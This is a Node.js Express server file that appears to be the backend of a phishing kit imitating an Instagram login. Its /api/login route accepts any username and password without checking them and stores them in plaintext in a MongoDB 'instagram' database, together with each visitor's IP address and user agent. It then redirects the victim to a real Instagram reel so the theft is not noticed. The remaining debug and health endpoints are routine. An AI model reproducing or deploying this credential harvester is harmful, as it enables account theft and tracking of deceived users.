require('dotenv').config();
const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

// Middleware to parse URL-encoded and JSON bodies
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, "public")));

// MongoDB connection handling
let isConnected = false;

const validateMongoURI = (uri) => {
  if (!uri) {
    throw new Error('MongoDB URI is not defined');
  }
  
  // Remove any leading/trailing whitespace
  uri = uri.trim();
  
  if (!uri.startsWith('mongodb://') && !uri.startsWith('mongodb+srv://')) {
    throw new Error('Invalid MongoDB URI format. Must start with mongodb:// or mongodb+srv://');
  }
  
  // Add database name if not present
  if (!uri.includes('/?')) {
    uri = uri.replace('?', '/instagram?');
  }
  
  return uri;
};

const connectToDatabase = async () => {
  if (isConnected) {
    console.log('Using existing database connection');
    return;
  }

  try {
    console.log('Validating connection string...');
    const mongoURI = validateMongoURI(process.env.MONGODB_URI);
    console.log('MongoDB URI format is valid');
    
    console.log('Creating new database connection');
    const connection = await mongoose.connect(mongoURI, {
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 5000,
      connectTimeoutMS: 5000,
      maxPoolSize: 10,
      minPoolSize: 5
    });

    // Verify database connection
    await connection.connection.db.admin().ping();
    
    isConnected = true;
    console.log('Database Connected Successfully');
    console.log('Connected to database:', connection.connection.name);
  } catch (error) {
    console.error('MongoDB connection error:', error.message);
    isConnected = false;
    
    // More specific error messages
    if (error.message.includes('ENOTFOUND')) {
      throw new Error('Could not reach MongoDB Atlas. Please check your internet connection and MongoDB URI.');
    } else if (error.message.includes('bad auth')) {
      throw new Error('Authentication failed. Please check your MongoDB username and password.');
    } else {
      throw error;
    }
  }
};

// Define User Schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
  timestamp: { type: Date, default: Date.now },
  userAgent: String,
  ipAddress: String
}, { 
  timestamps: true,
  collection: 'users' 
});

const User = mongoose.model("User", userSchema);

// Debug endpoint to check environment variables
app.get("/api/debug-env", async (req, res) => {
  try {
    // Get MongoDB URI and mask the password
    const uri = process.env.MONGODB_URI || 'Not set';
    const maskedUri = uri.replace(/:([^@]+)@/, ':****@');
    
    // Check if URI has leading/trailing spaces
    const hasSpaces = uri !== uri.trim();
    
    // Validate URI format
    let uriFormatValid = false;
    try {
      validateMongoURI(uri);
      uriFormatValid = true;
    } catch (error) {}

    res.json({
      mongodb_uri_set: !!process.env.MONGODB_URI,
      mongodb_uri_masked: maskedUri,
      uri_has_spaces: hasSpaces,
      uri_format_valid: uriFormatValid,
      uri_starts_correctly: uri.startsWith('mongodb+srv://') || uri.startsWith('mongodb://'),
      environment: process.env.NODE_ENV || 'not set',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({ 
      error: "Error checking environment",
      message: error.message 
    });
  }
});

// Routes
app.post("/api/login", async (req, res) => {
  const startTime = Date.now();
  let timeoutId;
  
  try {
    // Set a timeout for the entire operation
    const operationTimeout = new Promise((_, reject) => {
      timeoutId = setTimeout(() => {
        reject(new Error('Operation timed out'));
      }, 8000);
    });

    console.log('Connecting to database...');
    await Promise.race([
      connectToDatabase(),
      operationTimeout
    ]);
    
    const { username, password } = req.body;

    if (!username || !password) {
      clearTimeout(timeoutId);
      return res.status(400).json({
        error: "Validation error",
        message: "Username and password are required"
      });
    }

    const newUser = new User({
      username,
      password,
      userAgent: req.headers['user-agent'],
      ipAddress: req.headers['x-forwarded-for'] || req.connection.remoteAddress
    });

    await Promise.race([
      newUser.save(),
      new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Save operation timed out')), 4000)
      )
    ]);

    clearTimeout(timeoutId);
    console.log(`Operation completed in ${Date.now() - startTime}ms`);
    
    return res.redirect('https://www.instagram.com/reel/DG0p3fFyRUG/?igsh=MmU2MmFkMHl2Z3Fw');
  } catch (err) {
    if (timeoutId) clearTimeout(timeoutId);
    console.error("Error in /api/login:", err.message);
    
    // Send more specific error messages
    if (err.message.includes('MongoDB URI')) {
      return res.status(500).json({
        error: "Database configuration error",
        message: "Please contact support. Configuration issue detected."
      });
    }
    
    return res.status(500).json({ 
      error: "Internal server error",
      message: process.env.NODE_ENV === 'development' ? err.message : "An unexpected error occurred"
    });
  }
});

// Serve the HTML file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Health check endpoint
app.get("/api/health", async (req, res) => {
  try {
    await connectToDatabase();
    res.status(200).json({ 
      status: 'healthy', 
      database: 'connected',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({ 
      status: 'unhealthy', 
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Export the app for Vercel
module.exports = app;

// Start the server if not running on Vercel
if (process.env.NODE_ENV !== 'production') {
  app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
  });
}
